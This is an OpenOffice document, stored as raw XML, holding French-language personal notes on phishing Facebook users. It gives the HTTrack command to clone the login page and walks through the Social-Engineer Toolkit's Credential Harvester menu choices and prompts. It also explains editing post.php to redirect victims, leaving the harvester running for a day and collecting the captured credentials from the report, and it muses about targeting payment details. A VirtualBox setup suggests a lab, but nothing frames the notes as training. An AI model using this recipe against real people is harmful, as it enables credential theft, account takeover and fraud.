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Courier New"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justify" style:justify-single-word="false" fo:padding="0.074cm" fo:border-left="none" fo:border-right="none" fo:border-top="none" fo:border-bottom="0.002cm solid #000000" style:join-border="false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6" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L1">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L2">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L3">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L4">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-weight="normal" style:font-weight-asian="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L5">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/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HISHING</text:p>
      <text:p text:style-name="P1"/>
      <text:list xml:id="list6137292615080504546" text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P6">Mirror la page de login facebook avec HTTrack.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P2"/>
      <text:list xml:id="list2695342435823565311" text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P7">Ouvrir le SET</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P2"/>
      <text:list xml:id="list3796925907942553167" text:style-name="L3">
        <text:list-item>
          <text:p text:style-name="P8">Credit Harvester Method – Custom Import – pointer vers le dossier dans lequel la page de login facebook a été copiée (ou le dossier Apache si l'index.html correspondant s'y trouve déjà). Appuyer sur 2, tout copier.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P2"/>
      <text:list xml:id="list8463716525908123090" text:style-name="L4">
        <text:list-item>
          <text:p text:style-name="P9">Dans le dossier du serveur Apache on retrouve notre index.html, mais aussi post.php. Pour gérer la redirection, éditer le fichier post.php, modifier « url=test.php" », avec test.php une page custom.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P2"/>
      <text:list xml:id="list7358442479235239122" text:style-name="L5">
        <text:list-item>
          <text:p text:style-name="P10">Une fois qu'on a le fichier index.html et post.php redirigeant vers la bonne page, on est ready to go.</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">Plan : Fake Page → Fak Page de traitement → Avec un lien vers facebook.login.php</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">Paiement ?</text:p>
      <text:p text:style-name="P2">Vérifier les informations ?</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"><text:a xlink:type="simple" xlink:href="https://secure.facebook.com/settings?tab=payments&amp;ref=settings_nav" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://secure.facebook.com/settings?tab=payments&amp;ref=settings_nav</text:a></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">Port forward le port 80 dans la machine hôte et la machine cible dans les réglages de VirtualBox.</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">Cloner la page de login avec HTTRack et bouger le fichier index.html.</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"><text:a xlink:type="simple" xlink:href="https://samuraihacks.com/hack-facebook-using-setoolkit/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://samuraihacks.com/hack-facebook-using-setoolkit/</text:a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EN LOCAL :</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P3">httrack https://www.facebook.com/ -O /root/httrackfacebook</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P4">Ensuite on a un dossier /root/httrackfacebook à la racine. On l'ouvre, on va dans fr-fr.facebook.com/login, et c'est le fichier index.html qu'il y a dedans qui nous intéresse. On peut le modifier pour customiser notre page comme on veut.</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Autre façon :</text:p>
      <text:p text:style-name="P4">Aller sur <text:a xlink:type="simple" xlink:href="https://facebook.com/login.php" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://facebook.com/login.php</text:a></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Clic droit, Save Page As... Sélectionner le dossier /root/phishing, renommer le fichier en index.html. On peut ensuite personnaliser l'index.html.</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Ensuite on ouvre le setoolkit :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">setoolkit</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">set&gt; 1<text:tab/><text:tab/><text:tab/>### Social Engineering Attacks</text:p>
      <text:p text:style-name="P4">set&gt; 2<text:tab/><text:tab/><text:tab/>### Website attack vectors</text:p>
      <text:p text:style-name="P4">set:webattack&gt; 3<text:tab/>### Credentials Harvester Attack Method</text:p>
      <text:p text:style-name="P4">set:webattack&gt;3<text:tab/>### Custom import</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">set:webattack&gt; IP address for the POST back in Harvester/Tabnabbing [10.0.2.15]: 10.0.2.15</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">set:webattack&gt; Path to the website to be cloned:/root/phishing</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Enter choice [1/2]: 2</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">set:webattack&gt; URL of the website you imported: <text:a xlink:type="simple" xlink:href="https://www.facebook.com/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://www.facebook.com/</text:a> ###entrer l'URL vers laquelle rediriger</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Press enter. Laisser le programme tourner (pendant une journée par exemple). Appuyer sur Ctrl+C, et aller voir le report (l'ouvrir avec gedit pour plus de visibilité). Les credentials récupérés seront là.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7-21T00:36:17.89</meta:creation-date>
    <dc:date>2022-01-30T18:47:17.67</dc:date>
    <meta:editing-duration>PT5H5M55S</meta:editing-duration>
    <meta:editing-cycles>13</meta:editing-cycles>
    <meta:generator>OpenOffice/4.1.11$Win32 OpenOffice.org_project/4111m1$Build-9808</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="2" meta:paragraph-count="30" meta:word-count="322" meta:character-count="2192"/>
  </office:meta>
</office:document-meta>
</file>